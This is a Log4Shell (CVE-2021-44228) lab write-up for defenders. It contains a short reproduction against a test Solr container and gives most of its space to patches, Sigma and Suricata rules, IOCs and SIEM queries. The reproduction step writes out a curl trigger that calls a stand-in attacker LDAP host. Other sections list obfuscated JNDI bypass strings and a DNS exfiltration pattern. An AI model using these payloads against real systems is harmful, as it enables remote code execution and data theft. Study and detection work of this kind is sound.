# CVE-2021-44228 — Apache Log4Shell JNDI Injection RCE

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE ID | CVE-2021-44228 |
| CVSS | 10.0 (Critical) |
| Affected | Apache Log4j 2.0-beta9 through 2.14.1 |
| Type | Remote Code Execution via JNDI Injection |
| CISA KEV | Yes (2021-12-10) |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell) |

Apache Log4j 2 is a ubiquitous Java logging framework. Versions 2.0-beta9 through 2.14.1 evaluate JNDI lookup expressions embedded in log messages. An attacker who controls any logged input (HTTP headers, query parameters, form fields) can inject `${jndi:ldap://attacker/payload}` to force the application to load and execute a remote Java class.

The vulnerability was massively exploited in the wild starting December 2021. CISA, NSA, and FBI issued joint advisories. Ransomware groups (Conti, Khonsari), APTs (Hafnium, Aquatic Panda), and cryptominers all leveraged Log4Shell within days of disclosure.

## 2. Reproduction Steps

**Environment**: Apache Solr 8.11.0 (bundled Log4j 2.14.1), JDK 8u102 — via vulhub `log4j/CVE-2021-44228`.

**Attack Chain**:

```
┌─────────┐    ${jndi:ldap://attacker:1389/x}    ┌──────────┐
│  Solr   │ ◄──────────────────────────────────── │ Attacker │
│ (8983)  │                                       │          │
└────┬────┘                                       └──┬───┬───┘
     │ LDAP lookup                                   │   │
     ├──────────────────────────────────────────────►│   │
     │ ◄── Reference: codebase=http://attacker:8888/ │   │
     │                                               │   │
     │ GET /Exploit.class                            │   │
     ├──────────────────────────────────────────────►│   │
     │ ◄── Exploit.class (static initializer: RCE)  │   │
     │                                               │   │
     │ Runtime.exec("id") → root                     │   │
     └───────────────────────────────────────────────┘   │
```

**Steps**:
1. Start target: `docker compose up -d` (Solr on :8983)
2. Compile malicious class: `javac -source 8 -target 8 Exploit.java`
3. Start LDAP+HTTP server: `python3 ldap_server.py` (ports 1389, 8888)
4. Trigger: `curl -g 'http://target:8983/solr/admin/cores?action=${jndi:ldap://attacker:1389/Exploit}'`
5. Verify: `docker exec <container> cat /tmp/pwned.txt` → `uid=0(root)`

Full PoC: see `ldap_server.py` and `Exploit.java` in this directory.

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

1. **Upgrade Log4j** to 2.17.1+ (Java 8), 2.12.4+ (Java 7), or 2.3.2+ (Java 6)
2. **Remove JndiLookup class**: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
3. **Set JVM flag**: `-Dlog4j2.formatMsgNoLookups=true` (partial mitigation, bypassed in some versions)
4. **Set environment variable**: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
5. **Upgrade JDK** to 8u191+ / 11.0.1+ (disables remote codebase loading by default via `com.sun.jndi.ldap.object.trustURLCodebase=false`)
6. **WAF rules**: Block `${jndi:` and obfuscated variants in all HTTP fields (headers, params, body)
7. **Network segmentation**: Restrict outbound LDAP/RMI/DNS from application servers
8. **Dependency scanning**: Use tools like `log4j-scan`, Syft/Grype, or Trivy to find nested log4j in fat JARs
9. **Disable JNDI entirely** in log4j config: `<Configuration><Properties><Property name="log4j2.enableJndi">false</Property></Properties></Configuration>`

### 3.2 Detection (Narrative)

**Web Application Firewall / ModSecurity**:
Inspect all HTTP request fields (not just URI — headers like User-Agent, X-Forwarded-For, Referer are common injection vectors). Match against `${jndi:` and known obfuscation patterns:
- `${${lower:j}ndi:`, `${${::-j}${::-n}${::-d}${::-i}:`, `${${env:NaN:-j}ndi:}`

**Falco (Container Runtime)**:
Alert when a Java process spawns unexpected child processes (bash, sh, curl, wget, nc, python). In containerized environments, any shell spawn from a JVM is suspicious.

**Network Detection**:
Monitor outbound connections from application servers to unusual ports (1389, 1099, 8888) or to external LDAP/RMI endpoints. DNS queries containing `${` or `jndi` substrings indicate active exploitation attempts.

### 3.3 Threat Hunting (Narrative)

**File System Indicators**:
- Scan all Java applications for vulnerable log4j versions: `find / -name "log4j-core-2.*.jar" | grep -v "2.17\|2.12.4\|2.3.2"`
- Check for nested dependencies in fat JARs/WARs: `find / -name "*.jar" -exec unzip -l {} 2>/dev/null \; | grep "log4j-core"`
- Look for newly created files in /tmp or web-accessible directories post-exploitation

**Process Indicators**:
- Java processes spawning shell interpreters: `parent_process=java AND child_process IN (bash, sh, cmd.exe, powershell)`
- Java processes making outbound LDAP/RMI connections to non-corporate IPs
- Unexpected classloader activity in JVM debug logs

**Network Indicators**:
- Outbound connections to ports 1389, 1099 (common JNDI exploitation ports)
- HTTP requests from internal Java apps to external IPs fetching `.class` files
- DNS TXT/A queries with encoded data (exfiltration via `${jndi:dns://data.attacker.com}`)

**Log Indicators**:
- Application logs containing `${jndi:` (even if exploitation failed)
- Solr/Elasticsearch/Struts access logs with JNDI payloads in any field
- WAF logs showing blocked `${jndi:` patterns (indicates active targeting)

### 3.4 SOC Artifacts

#### 3.4.1 Sigma Rule

```yaml
title: Log4Shell JNDI Injection Attempt in Web Logs
id: a]f3b8e1-7c2d-4f5a-9b1e-3d4c6e8f0a2b
status: stable
level: critical
description: >
  Detects Log4Shell (CVE-2021-44228) exploitation attempts by matching
  JNDI lookup patterns in web server access logs, including obfuscated variants.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://logging.apache.org/log4j/2.x/security.html
author: Security Lab
date: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - attack.execution
  - attack.t1059.004
  - cve.2021.44228
logsource:
  category: webserver
  product: apache
detection:
  selection_jndi:
    cs-uri-query|contains:
      - '${jndi:'
      - '%24%7Bjndi:'
      - '${${lower:j}ndi:'
      - '${${::-j}${::-n}${::-d}${::-i}:'
  selection_headers:
    cs-User-Agent|contains:
      - '${jndi:'
      - '%24%7Bjndi:'
    cs-Referer|contains:
      - '${jndi:'
  condition: selection_jndi or selection_headers
falsepositives:
  - Security scanners testing for Log4Shell
  - Legitimate use of JNDI in query strings (extremely rare)
```

#### 3.4.2 Sigma Rule — Post-Exploitation (Process Creation)

```yaml
title: Log4Shell Post-Exploitation - Java Process Spawning Shell
id: b2c4d6e8-1a3f-5b7d-9e0c-2f4a6b8d0e1c
status: stable
level: high
description: >
  Detects post-exploitation activity where a Java process spawns a shell
  interpreter, indicating successful Log4Shell (or similar) RCE.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
author: Security Lab
date: 2026/05/21
tags:
  - attack.execution
  - attack.t1059.004
  - cve.2021.44228
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/java'
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/curl'
      - '/wget'
      - '/python'
      - '/python3'
      - '/nc'
      - '/ncat'
  condition: selection
falsepositives:
  - Legitimate Java applications that spawn shell processes (CI/CD tools)
```

#### 3.4.3 Suricata Rules

```
# Log4Shell JNDI Injection in HTTP Request (URI + Headers)
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Apache Log4j JNDI Injection Attempt (CVE-2021-44228)";
  flow:established,to_server;
  content:"${jndi:"; nocase; fast_pattern;
  content:"ldap://"; nocase; distance:0;
  reference:cve,2021-44228;
  classtype:attempted-admin;
  sid:2021044228;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2021-44228;
)

# Log4Shell Obfuscated JNDI Injection (lower/upper bypass)
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Apache Log4j Obfuscated JNDI Injection (CVE-2021-44228)";
  flow:established,to_server;
  content:"${"; fast_pattern;
  pcre:"/\$\{[^\}]*(?:lower|upper|::-)[^\}]*\}[^\}]*(?:jndi|ldap|rmi|dns)/i";
  reference:cve,2021-44228;
  classtype:attempted-admin;
  sid:2021044229;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2021-44228;
)

# Log4Shell Post-Exploitation: Java fetching .class from external
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"ET EXPLOIT Log4Shell Post-Exploitation - Java Loading Remote Class";
  flow:established,to_server;
  content:"GET"; http_method;
  content:".class"; http_uri; endswith;
  reference:cve,2021-44228;
  classtype:trojan-activity;
  sid:2021044230;
  rev:1;
  metadata:attack_target Server, deployment Internal, tag CVE-2021-44228;
)
```

#### 3.4.4 Structured IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| Pattern (URI/Header) | `${jndi:ldap://` | High | Primary injection pattern |
| Pattern (Obfuscated) | `${${lower:j}ndi:` | High | Case-bypass variant |
| Pattern (Obfuscated) | `${${::-j}${::-n}${::-d}${::-i}:` | High | Substring-bypass variant |
| Pattern (Obfuscated) | `${${env:NaN:-j}ndi:` | High | Env-lookup bypass |
| Pattern (Obfuscated) | `%24%7Bjndi:` | Medium | URL-encoded variant |
| Network | Outbound LDAP to non-corporate IP:1389 | High | JNDI exploitation callback |
| Network | Outbound RMI to non-corporate IP:1099 | High | Alternative JNDI protocol |
| Network | HTTP GET *.class from external IP | High | Remote classloading |
| File | `/tmp/log4j2-jndi*.tmp` | Medium | Log4j JNDI temp files |
| Process | java → bash/sh/curl/wget | Critical | Post-exploitation indicator |
| Library | log4j-core-2.0 through 2.14.1 | Critical | Vulnerable versions |
| Library | log4j-core-2.15.0 | High | Incomplete fix (CVE-2021-45046) |
| Library | log4j-core-2.16.0 | Medium | DoS still possible (CVE-2021-45105) |

#### 3.4.5 SIEM Hunting Queries

**Splunk SPL — Detect JNDI Injection in Web Logs**:

```spl
index=web sourcetype=access_combined OR sourcetype=apache:access
| eval request_all=uri."+".useragent."+".referer
| where match(request_all, "(?i)\$\{.*jndi:(ldap|rmi|dns|iiop)://")
| stats count by src_ip, uri, useragent, status
| sort -count
| table src_ip uri useragent status count
```

**Splunk SPL — Post-Exploitation: Java Spawning Shell**:

```spl
index=sysmon OR index=linux sourcetype=sysmon OR sourcetype=linux:audit
| where parent_process_name="java" AND
  (process_name="bash" OR process_name="sh" OR process_name="curl"
   OR process_name="wget" OR process_name="nc")
| table _time host parent_process_name process_name cmdline user
| sort -_time
```

**Microsoft Sentinel KQL — JNDI Injection in Web Logs**:

```kql
W3CIISLog
| where csUriQuery has "${jndi:" or csUriQuery has "%24%7Bjndi:"
    or csUserAgent has "${jndi:" or csReferer has "${jndi:"
| extend JNDIPayload = extract(@"\$\{jndi:(ldap|rmi|dns)://([^/\}]+)", 0, 
    coalesce(csUriQuery, csUserAgent, csReferer))
| project TimeGenerated, cIP, csUriStem, JNDIPayload, scStatus, csUserAgent
| sort by TimeGenerated desc
```

**Microsoft Sentinel KQL — Post-Exploitation Process Tree**:

```kql
DeviceProcessEvents
| where InitiatingProcessFileName == "java" or InitiatingProcessFileName == "java.exe"
| where FileName in~ ("bash","sh","cmd.exe","powershell.exe","curl","wget","nc","ncat")
| project Timestamp, DeviceName, InitiatingProcessCommandLine, FileName, 
    ProcessCommandLine, AccountName
| sort by Timestamp desc
```

## 4. References

- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Alert AA21-356A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [SigmaHQ Log4Shell Rules](https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_44228_log4j)
- [Emerging Threats Suricata Rules](https://rules.emergingthreats.net/open/)
- [Splunk Security Content - Log4Shell](https://research.splunk.com/stories/log4shell_cve-2021-44228/)
- [Microsoft Log4j Guidance](https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)
